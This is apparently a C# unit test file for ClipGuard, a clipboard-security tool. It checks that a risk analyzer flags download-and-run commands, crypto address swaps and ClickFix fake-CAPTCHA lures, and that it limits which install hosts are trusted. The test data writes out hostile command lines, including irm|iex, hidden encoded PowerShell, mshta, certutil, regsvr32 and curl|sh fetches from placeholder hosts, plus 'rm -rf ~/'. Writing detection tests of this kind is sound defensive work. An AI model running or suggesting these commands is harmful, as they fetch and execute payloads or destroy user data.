using ClipGuard.Services;

namespace ClipGuard.Tests;

public class RiskAnalyzerTests
{
    // ── Shell commands ────────────────────────────────────────────────────

    [Theory]
    [InlineData("curl -sL https://example.test/install.sh | sh")]
    [InlineData("wget -qO- https://example.test/x | bash")]
    [InlineData("irm https://example.test/install.ps1 | iex")]
    [InlineData("iwr https://example.test/a | Invoke-Expression")]
    [InlineData("powershell -nop -w hidden -enc SGVsbG8=")]
    [InlineData("powershell -NoProfile -WindowStyle Hidden -Command \"whatever\"")]
    [InlineData("mshta https://example.test/payload.hta")]
    [InlineData("certutil -urlcache -f https://example.test/x.exe x.exe")]
    [InlineData("bitsadmin /transfer j https://example.test/x.exe c:\\x.exe")]
    [InlineData("regsvr32 /s /u /i:https://example.test/x.sct scrobj.dll")]
    [InlineData("echo aGk= | base64 -d | sh")]
    public void Classifies_download_and_run_commands(string payload) =>
        Assert.Equal(RiskKind.ShellCommand, RiskAnalyzer.Classify(payload));

    [Theory]
    [InlineData("just some ordinary notes")]
    [InlineData("https://github.com/SandSlideStudio/clipguard")]
    [InlineData("git clone https://github.com/SandSlideStudio/clipguard.git")]
    [InlineData("npm install clipguard")]
    [InlineData("Q3 planning notes — draft v2")]
    [InlineData("")]
    [InlineData(null)]
    public void Leaves_ordinary_content_alone(string? content) =>
        Assert.Equal(RiskKind.None, RiskAnalyzer.Classify(content));

    // ── Wallet addresses ──────────────────────────────────────────────────

    [Theory]
    [InlineData("bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh")]
    [InlineData("0x71C7656EC7ab88b098defB751B7401B5f6d8976F")]
    [InlineData("1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2")]
    public void Classifies_wallet_addresses(string address) =>
        Assert.Equal(RiskKind.CryptoAddress, RiskAnalyzer.Classify(address));

    [Fact]
    public void Address_replaced_by_a_different_address_is_high_risk() =>
        Assert.True(RiskAnalyzer.IsHighRiskSubstitution(
            "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
            "bc1q9d8ftvbn2h4kxs7ug0rl4mc3ep6yzq5tfwe2xa"));

    [Fact]
    public void Address_replaced_by_the_same_address_is_not_a_swap() =>
        Assert.False(RiskAnalyzer.IsHighRiskSubstitution(
            "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
            "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"));

    // ── ClickFix verification lures ───────────────────────────────────────

    [Theory]
    [InlineData("powershell -w hidden -c \"irm e.test/a|iex\" # I am not a robot")]
    [InlineData("irm https://e.test/a | iex # reCAPTCHA Verification ID: 4471")]
    [InlineData("mshta https://e.test/x # Cloudflare Ray ID: 8f2a")]
    public void Detects_verification_lures(string payload) =>
        Assert.True(RiskAnalyzer.IsVerificationLure(payload));

    [Fact]
    public void Verification_text_without_a_command_is_not_a_lure() =>
        Assert.False(RiskAnalyzer.IsVerificationLure("Please verify you are human to continue"));

    // ── Trusted install sources ───────────────────────────────────────────

    [Theory]
    [InlineData("irm https://ollama.com/install.ps1 | iex")]
    [InlineData("curl -fsSL https://get.docker.com | sh")]
    [InlineData("curl --proto '=https' https://sh.rustup.rs -sSf | sh")]
    public void Vendor_install_endpoints_are_trusted(string command) =>
        Assert.True(RiskAnalyzer.IsTrustedInstallSource(command));

    [Fact]
    public void Unknown_hosts_are_not_trusted() =>
        Assert.False(RiskAnalyzer.IsTrustedInstallSource("irm https://evil.example/x.ps1 | iex"));

    [Fact]
    public void Every_host_must_be_trusted_not_just_one() =>
        Assert.False(RiskAnalyzer.IsTrustedInstallSource(
            "curl -fsSL https://get.docker.com/a | sh ; curl -fsSL https://evil.example/b | sh"));

    [Fact]
    public void A_lure_overrides_the_allowlist()
    {
        // Hosting on a trusted domain must not launder a fake CAPTCHA step.
        Assert.False(RiskAnalyzer.IsTrustedInstallSource(
            "irm https://ollama.com/install.ps1 | iex # I am not a robot - Verification ID: 1"));
    }

    [Fact]
    public void User_vouched_hosts_are_honoured() =>
        Assert.True(RiskAnalyzer.IsTrustedInstallSource(
            "irm https://internal.corp.test/setup.ps1 | iex",
            new[] { "internal.corp.test" }));

    [Theory]
    [InlineData("aka.ms")]
    [InlineData("raw.githubusercontent.com")]
    [InlineData("gist.github.com")]
    public void Redirectors_and_user_content_hosts_are_not_trusted(string host)
    {
        // These would let an attacker serve a payload from an allowlisted name.
        Assert.False(RiskAnalyzer.IsTrustedInstallSource($"irm https://{host}/x.ps1 | iex"));
    }

    [Fact]
    public void Extracts_every_host_referenced()
    {
        var hosts = RiskAnalyzer.ExtractHosts("curl https://a.test/x | sh; curl http://b.test/y | sh");
        Assert.Equal(new[] { "a.test", "b.test" }, hosts);
    }

    [Fact]
    public void Commands_without_a_url_are_never_trusted() =>
        Assert.False(RiskAnalyzer.IsTrustedInstallSource("rm -rf ~/"));

    // ── Previews ──────────────────────────────────────────────────────────

    [Fact]
    public void Preview_is_capped_and_single_line()
    {
        var preview = RiskAnalyzer.Preview("line one\r\nline two" + new string('x', 400));

        Assert.True(preview.Length <= 121);
        Assert.DoesNotContain('\n', preview);
    }
}
